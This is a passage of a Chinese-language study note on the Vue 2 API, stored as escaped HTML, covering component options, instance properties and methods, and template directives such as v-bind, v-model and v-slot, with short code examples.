&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;inject&lt;/code&gt;也可以有默认项&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const Child = {  inject: {    foo: { default: &#39;foo&#39; }  }}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;选项其他&#34;&gt;选项/其他&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;name&#34;&gt;&lt;strong&gt;name&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;限制：只作为组件选项时起作用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;允许组件模板递归地调用自身。注意，组件在全局用 &lt;code&gt;Vue.component()&lt;/code&gt; 注册时，全局 ID 自动作为组件的 name。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;delimiters&#34;&gt;&lt;strong&gt;delimiters&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;默认：&lt;code&gt;[ &amp;quot;{{&amp;quot; , &amp;quot;}}&amp;quot; ]&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;作用：可以改变插入纯文本的方式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;new Vue({  delimiters: [&#39;${&#39;, &#39;}&#39;]})// 分隔符变成了 ES6 模板字符串的风格
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;model&#34;&gt;&lt;strong&gt;model&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;允许一个自定义组件在使用&lt;code&gt;v-model&lt;/code&gt;时定制prop和event。默认情况下，一个组件的&lt;code&gt;v-model&lt;/code&gt;会把&lt;code&gt;value&lt;/code&gt;用作prop且把&lt;code&gt;input&lt;/code&gt;用作event，&lt;/p&gt;
&lt;p&gt;但是一些输入类型比如单选框和复选框按钮可能想使用 &lt;code&gt;value&lt;/code&gt; prop 来达到不同的目的。使用 &lt;code&gt;model&lt;/code&gt; 选项可以回避这些情况产生的冲突。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;input v-model=&amp;quot;test&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本质上是：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;input :value=&amp;quot;test&amp;quot; @input=&amp;quot;test = $event.target.value&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Vue.component(&#39;my-checkbox&#39;, {  model: {    prop: &#39;checked&#39;,    event: &#39;change&#39;  },  props: {    // this allows using the `value` prop for a different purpose    value: String,    // use `checked` as the prop which take the place of `value`    checked: {      type: Number,      default: 0    }  },  // ...})
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;实例-property&#34;&gt;实例 property&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmdata&#34;&gt;&lt;strong&gt;vm.$data&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;可以&lt;code&gt;this.$data&lt;/code&gt;去调用属性，默认&lt;code&gt;this&lt;/code&gt;也指向$data&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmprops&#34;&gt;&lt;strong&gt;vm.$props&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;this.props&lt;/code&gt;调用传入属性&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmel&#34;&gt;&lt;strong&gt;vm.$el&lt;/strong&gt;&lt;/h3&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmoptions&#34;&gt;&lt;strong&gt;vm.$options&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;用于当前Vue实例的初始化选项（&lt;code&gt;data&lt;/code&gt;外的属性）。需要在选项中包含自定义property时会有用处&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;new Vue({  customOption: &#39;foo&#39;,  created: function () {    console.log(this.$options.customOption) // =&amp;gt; &#39;foo&#39;  }})
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmparent&#34;&gt;&lt;strong&gt;vm.$parent&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;访问父实例&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmroot&#34;&gt;&lt;strong&gt;vm.$root&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;当前组件树的根Vue实例，如果当前实例没有父实例，则指向自己&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmchildren&#34;&gt;&lt;strong&gt;vm.$children&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;当前实例的直接子组件。**&lt;code&gt;$children&lt;/code&gt; 并不保证顺序，也不是响应式的。**如果你发现自己正在尝试使用 &lt;code&gt;$children&lt;/code&gt; 来进行数据绑定，考虑使用一个数组配合 &lt;code&gt;v-for&lt;/code&gt; 来生成子组件，并且使用 Array 作为真正的来源。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmslots&#34;&gt;&lt;strong&gt;vm.$slots&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;用来访问被&lt;a href=&#34;https://cn.vuejs.org/v2/guide/components.html#%E9%80%9A%E8%BF%87%E6%8F%92%E6%A7%BD%E5%88%86%E5%8F%91%E5%86%85%E5%AE%B9&#34;&gt;插槽分发&lt;/a&gt;的内容。每个&lt;a href=&#34;https://cn.vuejs.org/v2/guide/components-slots.html#%E5%85%B7%E5%90%8D%E6%8F%92%E6%A7%BD&#34;&gt;具名插槽&lt;/a&gt;有其相应的 property (例如：&lt;code&gt;v-slot:foo&lt;/code&gt; 中的内容将会在 &lt;code&gt;vm.$slots.foo&lt;/code&gt; 中被找到)。&lt;code&gt;default&lt;/code&gt; property 包括了所有没有被包含在具名插槽中的节点，或 &lt;code&gt;v-slot:default&lt;/code&gt; 的内容。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmrefs&#34;&gt;&lt;strong&gt;vm.$refs&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;持有注册过 &lt;code&gt;ref&lt;/code&gt; attribute]的所有 DOM 元素和组件实例。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;mychild ref=&amp;quot;fanfan&amp;quot;&amp;gt; &amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;this.$refs.fanfan.xxx&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmattrs&#34;&gt;&lt;strong&gt;vm.$attrs&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;包含了父作用域中不作为 prop 被识别 (且获取) 的 attribute 绑定 (&lt;code&gt;class&lt;/code&gt; 和 &lt;code&gt;style&lt;/code&gt; 除外)。&lt;/p&gt;
&lt;p&gt;传入子组件的&lt;code&gt;props&lt;/code&gt;中没有被使用的就是&lt;code&gt;vm.$attrs&lt;/code&gt;的内容&lt;/p&gt;
&lt;p&gt;可以通过 &lt;code&gt;v-bind=&amp;quot;$attrs&amp;quot;&lt;/code&gt; 传入内部组件&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmlisteners&#34;&gt;&lt;strong&gt;vm.$listeners&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;p&gt;包含了父作用域中的 (不含 &lt;code&gt;.native&lt;/code&gt; 修饰器的) &lt;code&gt;v-on&lt;/code&gt; 事件监听器。它可以通过 &lt;code&gt;v-on=&amp;quot;$listeners&amp;quot;&lt;/code&gt; 传入内部组件&lt;br&gt;
存储的父实例传入的方法&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;实例方法数据&#34;&gt;实例方法/数据&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmwatch&#34;&gt;&lt;strong&gt;vm.$watch&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;观察 Vue 实例上的一个表达式或者一个函数计算结果的变化。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  watch:{
      function(){
         //当fan或者xi发生变化时候会触发
        return this.fan+this.xi
      },
      //或者回调函数形式一个个触发
       fan:[
             //methods的函数名 
            &#39;show&#39;,
            &#39;logsome&#39;,
             function(){
                    ...
              }
     ]
        
    },
        
        
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;vm.$watch&lt;/code&gt; 返回一个取消观察函数，用来停止触发回调：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var unwatch = vm.$watch(&#39;a&#39;, cb)// 之后取消观察unwatch()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmset&#34;&gt;&lt;strong&gt;vm.$set&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;用于向响应式对象添加属性&lt;/p&gt;
&lt;p&gt;如果是&lt;code&gt;this.myobj.fan=&#39;ismyname&#39;&lt;/code&gt;，虽然数据能被加载上去，但没有响应式getter/setter，但再次去改变这个值的时候&lt;code&gt;this.myobj.fan=&#39;change&#39;&lt;/code&gt;，数据发送了变化，但页面视图将不会变化&lt;/p&gt;
&lt;p&gt;当使用&lt;code&gt;this.$set(this.myobj,&#39;fan&#39;,&#39;ismyname&#39;)&lt;/code&gt;，新增的属性也变成了响应式的，页面也能够响应视图的变化&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmdelete&#34;&gt;&lt;strong&gt;vm.$delete&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;用于删除对象的property。&lt;strong&gt;能够确保删除会触发更新视图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;this.$delete(myobj,&#39;fan&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;实例方法事件&#34;&gt;实例方法/事件&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmon&#34;&gt;&lt;strong&gt;vm.$on&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;监听当前实例上的自定义事件。事件可以由 &lt;code&gt;vm.$emit&lt;/code&gt; 触发。回调函数会接收所有传入事件触发函数的额外参数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;vm.$on(&#39;test&#39;, function (msg) {  console.log(msg)})vm.$emit(&#39;test&#39;, &#39;hi&#39;)// =&amp;gt; &amp;quot;hi&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一般和props一起作用于父子传参&lt;/p&gt;
&lt;p&gt;parent&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;child :title=&amp;quot;title&amp;quot;  @childback=&amp;quot;toremove&amp;quot;&amp;gt;&amp;lt;/child&amp;gt;methods:{	toremove(value){		...	}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;child&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;template&amp;gt;	...&amp;lt;/template&amp;gt;somechange:function(){	this.$emit(&#39;childback&#39;,myvalue)}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmonce&#34;&gt;&lt;strong&gt;vm.$once&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;监听一个自定义事件，但是只触发一次。一旦触发之后，监听器就会被移除。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmoff&#34;&gt;&lt;strong&gt;vm.$off&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;移除自定义事件监听器。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果没有提供参数，则移除所有的事件监听器；&lt;/li&gt;
&lt;li&gt;如果只提供了事件，则移除该事件所有的监听器；&lt;/li&gt;
&lt;li&gt;如果同时提供了事件与回调，则只移除这个回调的监听器。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmemit&#34;&gt;&lt;strong&gt;vm.$emit&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;触发当前实例上的事件。附加参数都会传给监听器回调。&lt;/p&gt;
&lt;p&gt;配合&lt;code&gt;v-on&lt;/code&gt;使用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;实例方法生命周期&#34;&gt;实例方法/生命周期&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmmount&#34;&gt;&lt;strong&gt;vm.$mount&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;返回值：&lt;code&gt;vm&lt;/code&gt; 实例本身&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;如果 Vue 实例在实例化时没有收到 el 选项，则它处于“未挂载”状态，没有关联的 DOM 元素。可以使用 &lt;code&gt;vm.$mount()&lt;/code&gt; 手动地挂载一个未挂载的实例。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;vm.$forceUpdate()var MyComponent = Vue.extend({  template: &#39;&amp;lt;div&amp;gt;Hello!&amp;lt;/div&amp;gt;&#39;})// 创建并挂载到 #app (会替换 #app)new MyComponent().$mount(&#39;#app&#39;)// 同上new MyComponent({ el: &#39;#app&#39; })// 或者，在文档之外渲染并且随后挂载var component = new MyComponent().$mount()document.getElementById(&#39;app&#39;).appendChild(component.$el)
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmforceupdate&#34;&gt;&lt;strong&gt;vm.$forceUpdate()&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;p&gt;迫使Vue实例重新渲染，&lt;strong&gt;触发updated生命周期&lt;/strong&gt;。&lt;strong&gt;它仅仅影响实例本身和插入插槽内容的子组件，而不是所有子组件。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmnexttick&#34;&gt;&lt;strong&gt;vm.$nextTick()&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;将回调延迟到下次DOM更新循环后，用于数据修改后，对DOM操作时候使用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;vmdestory&#34;&gt;&lt;strong&gt;vm.$destory()&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;完全销毁一个实例。清理它与其他实例的连接，解绑它的全部指令以及事件监听器。**触发&lt;code&gt;beforeDestory&lt;/code&gt;和&lt;code&gt;destoryed&lt;/code&gt;**的钩子。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;指令&#34;&gt;指令&lt;/h2&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-text&#34;&gt;&lt;strong&gt;v-text&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;更新元素的&lt;code&gt;tetxContent&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;span v-text=&amp;quot;msg&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;
&amp;lt;!-- 和下面的一样 --&amp;gt;
&amp;lt;span&amp;gt;{{msg}}&amp;lt;/span&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-html&#34;&gt;&lt;strong&gt;v-html&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;更新元素的&lt;code&gt;innnerHTML&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div v-html=&amp;quot;myhtml&amp;quot;&amp;gt; &amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-show&#34;&gt;&lt;strong&gt;v-show&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;详细：&lt;/p&gt;
&lt;p&gt;切换元素的&lt;code&gt;display&lt;/code&gt;，当条件变化时该指令触发过渡效果。&lt;/p&gt;
&lt;p&gt;更适合用于组件频繁切换显示与隐藏。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-if&#34;&gt;&lt;strong&gt;v-if&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;在切换时元素及它的数据绑定 / 组件被销毁并重建。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;当和 &lt;code&gt;v-if&lt;/code&gt; 一起使用时，&lt;code&gt;v-for&lt;/code&gt; 的优先级比 &lt;code&gt;v-if&lt;/code&gt; 更高。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-else&#34;&gt;&lt;strong&gt;v-else&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;配合&lt;code&gt;v-if&lt;/code&gt;或者&lt;code&gt;v-else-if&lt;/code&gt;使用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-for&#34;&gt;&lt;strong&gt;v-for&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;用于多次渲染元素或模块化。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div v-for=&amp;quot;(item, index) in items&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div v-for=&amp;quot;(val, key) in object&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div v-for=&amp;quot;(val, name, index) in object&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-on&#34;&gt;&lt;strong&gt;v-on&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;缩写：&lt;code&gt;@&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;修饰符：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.stop&lt;/code&gt; - 调用 &lt;code&gt;event.stopPropagation()&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.prevent&lt;/code&gt; - 调用 &lt;code&gt;event.preventDefault()&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.capture&lt;/code&gt; - 添加事件侦听器时使用 capture 模式。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.self&lt;/code&gt; - 只当事件是从侦听器绑定的元素本身触发时才触发回调。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.{keyCode | keyAlias}&lt;/code&gt; - 只当事件是从特定键触发时才触发回调。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.native&lt;/code&gt; - 监听组件根元素的原生事件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.once&lt;/code&gt; - 只触发一次回调。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.left&lt;/code&gt; - (2.2.0) 只当点击鼠标左键时触发。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.right&lt;/code&gt; - (2.2.0) 只当点击鼠标右键时触发。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.middle&lt;/code&gt; - (2.2.0) 只当点击鼠标中键时触发。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.passive&lt;/code&gt; - (2.3.0) 以 &lt;code&gt;{ passive: true }&lt;/code&gt; 模式添加侦听器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-bind&#34;&gt;&lt;strong&gt;v-bind&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;缩写：&lt;code&gt;:&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修饰符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.prop&lt;/code&gt; - 作为一个 DOM property 绑定而不是作为 attribute 绑定。(&lt;a href=&#34;https://stackoverflow.com/questions/6003819/properties-and-attributes-in-html#answer-6004028&#34;&gt;差别在哪里？&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.camel&lt;/code&gt; - (2.1.0+) 将 kebab-case attribute 名转换为 camelCase。(从 2.1.0 开始支持)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.sync&lt;/code&gt; (2.3.0+) 语法糖，会扩展成一个更新父组件绑定值的 &lt;code&gt;v-on&lt;/code&gt; 侦听器。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 绑定一个 attribute --&amp;gt;&amp;lt;img v-bind:src=&amp;quot;imageSrc&amp;quot;&amp;gt;&amp;lt;!-- 动态 attribute 名 (2.6.0+) --&amp;gt;&amp;lt;button v-bind:[key]=&amp;quot;value&amp;quot;&amp;gt;&amp;lt;/button&amp;gt;&amp;lt;!-- 缩写 --&amp;gt;&amp;lt;img :src=&amp;quot;imageSrc&amp;quot;&amp;gt;&amp;lt;!-- 动态 attribute 名缩写 (2.6.0+) --&amp;gt;&amp;lt;button :[key]=&amp;quot;value&amp;quot;&amp;gt;&amp;lt;/button&amp;gt;&amp;lt;!-- 内联字符串拼接 --&amp;gt;&amp;lt;img :src=&amp;quot;&#39;/path/to/images/&#39; + fileName&amp;quot;&amp;gt;&amp;lt;!-- class 绑定 --&amp;gt;&amp;lt;div :class=&amp;quot;{ red: isRed }&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div :class=&amp;quot;[classA, classB]&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div :class=&amp;quot;[classA, { classB: isB, classC: isC }]&amp;quot;&amp;gt;&amp;lt;!-- style 绑定 --&amp;gt;&amp;lt;div :style=&amp;quot;{ fontSize: size + &#39;px&#39; }&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div :style=&amp;quot;[styleObjectA, styleObjectB]&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;!-- 绑定一个全是 attribute 的对象 --&amp;gt;&amp;lt;div v-bind=&amp;quot;{ id: someProp, &#39;other-attr&#39;: otherProp }&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;!-- 通过 prop 修饰符绑定 DOM attribute --&amp;gt;&amp;lt;div v-bind:text-content.prop=&amp;quot;text&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;!-- prop 绑定。“prop”必须在 my-component 中声明。--&amp;gt;&amp;lt;my-component :prop=&amp;quot;someThing&amp;quot;&amp;gt;&amp;lt;/my-component&amp;gt;&amp;lt;!-- 通过 $props 将父组件的 props 一起传给子组件 --&amp;gt;&amp;lt;child-component v-bind=&amp;quot;$props&amp;quot;&amp;gt;&amp;lt;/child-component&amp;gt;&amp;lt;!-- XLink --&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;a :xlink:special=&amp;quot;foo&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-model&#34;&gt;&lt;strong&gt;v-model&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;select&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;componets&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修饰符：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.lazy&lt;/code&gt;：不会实时跟随变化（&lt;code&gt;input事件&lt;/code&gt;），等失焦后变化（&lt;code&gt;change&lt;/code&gt;事件）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.number&lt;/code&gt;：输入字符串转化为有效数字。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.trim&lt;/code&gt;：输入首位空格过滤。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;v-slot&#34;&gt;&lt;strong&gt;v-slot&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;缩写：&lt;code&gt;#&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;提供具名插槽或者需要接收prop的默认插槽。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;示例：&lt;/p&gt;
